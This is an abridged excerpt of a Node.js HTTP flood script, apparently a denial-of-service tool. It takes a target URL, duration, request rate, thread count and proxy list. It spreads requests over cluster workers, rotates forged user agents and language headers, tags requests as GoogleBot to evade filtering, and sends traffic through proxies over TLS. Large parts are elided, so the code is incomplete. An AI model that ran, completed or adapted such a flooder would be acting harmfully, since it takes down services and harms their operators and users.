...
if (process.argv.length < 7) {
    console.log('node http.js <url> <time> <requests> <threads> <proxy>'.rainbow);
    process.exit();
}
...
function randomCharacters(length) {
    ...
    "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
       ...
       "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
       "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
       "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020", "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
       "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
       "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
       "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
       "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
...
'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  ...
  'zu-ZA,zu;q=0.8',
    ...
    if (cluster.isMaster) {
        ...
        console.clear()
        console.log("[succesfully] [@tcp_spoofed]".bgBlue);
    ...
    headers["user-agent"] = uas + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
    ...
    function runFlooder() {
        ...
        Socker.HTTP(proxyOptions, (connection, error) => {
            ...
            const tlsOptions = {
                port: 443,
                ALPNProtocols: [
                    "h2", "spdy/3.1" , "http/1.1" , "h3", "http/2+quic/43", "http/2+quic/44", "http/2+quic/45"
                ],
                secure: true,
                ciphers: ciphers,
                sigalgs: sigalgs,
